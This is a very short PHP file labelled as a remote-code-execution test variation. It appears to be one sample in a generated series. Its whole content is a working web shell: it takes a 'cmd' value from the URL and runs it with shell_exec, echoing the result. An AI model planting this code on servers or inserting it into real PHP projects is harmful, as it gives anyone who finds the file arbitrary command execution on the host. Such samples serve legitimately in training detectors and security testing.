<?php
// RCE test variation #665
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>